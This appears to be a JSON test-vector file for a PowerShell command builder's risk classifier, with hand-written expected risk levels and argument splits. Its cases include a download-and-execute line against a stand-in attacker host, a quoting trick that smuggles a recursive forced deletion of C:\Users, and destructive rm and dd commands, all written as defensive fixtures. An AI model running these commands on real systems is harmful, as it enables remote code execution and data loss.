{
  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (argv is always a whitespace split of raw; risk floor Medium; High when raw contains ; | & a line break, a backtick, $( { iex or Invoke-Expression; raw verbatim); never regenerate it from program output.",
  "cases": [
    {
      "class": "low-risk program raised to the Medium floor",
      "command": "ls",
      "cwd": "C:\\work",
      "risk": "medium",
      "bin": "ls",
      "argv": ["ls"]
    },
    {
      "class": "cmdlet the table doesn't know is Medium",
      "command": "Remove-Item -Recurse -Force build",
      "cwd": null,
      "risk": "medium",
      "bin": "Remove-Item",
      "argv": ["Remove-Item", "-Recurse", "-Force", "build"]
    },
    {
      "class": "risk above the floor is kept (High)",
      "command": "rm -rf build",
      "cwd": null,
      "risk": "high",
      "bin": "rm",
      "argv": ["rm", "-rf", "build"]
    },
    {
      "class": "risk above the floor is kept (Critical)",
      "command": "dd if=x of=y",
      "cwd": null,
      "risk": "critical",
      "bin": "dd",
      "argv": ["dd", "if=x", "of=y"]
    },
    {
      "class": "backtick escape: whitespace argv, High floor",
      "command": "Write-Output \"it`\"s\"",
      "cwd": null,
      "risk": "high",
      "bin": "Write-Output",
      "argv": ["Write-Output", "\"it`\"s\""]
    },
    {
      "class": "#316 B1: a POSIX-quoting trick can't hide Remove-Item inside a token",
      "command": "echo \"a\\\" ; Remove-Item -Recurse -Force C:\\Users ; echo \\\"b\"",
      "cwd": null,
      "risk": "high",
      "bin": "echo",
      "argv": [
        "echo",
        "\"a\\\"",
        ";",
        "Remove-Item",
        "-Recurse",
        "-Force",
        "C:\\Users",
        ";",
        "echo",
        "\\\"b\""
      ]
    },
    {
      "class": "#316 B1: a Windows path keeps its backslashes",
      "command": "Remove-Item C:\\Users\\me\\proj\\build -Recurse",
      "cwd": "C:\\Users\\me",
      "risk": "medium",
      "bin": "Remove-Item",
      "argv": ["Remove-Item", "C:\\Users\\me\\proj\\build", "-Recurse"]
    },
    {
      "class": "#316 S1: a pipeline into a script block fails upward",
      "command": "ls | % { rm $_ -Force }",
      "cwd": null,
      "risk": "high",
      "bin": "ls",
      "argv": ["ls", "|", "%", "{", "rm", "$_", "-Force", "}"]
    },
    {
      "class": "#316 S1: iex runs a downloaded string",
      "command": "iex (irm https://evil.example/x.ps1)",
      "cwd": null,
      "risk": "high",
      "bin": "iex",
      "argv": ["iex", "(irm", "https://evil.example/x.ps1)"]
    }
  ]
}
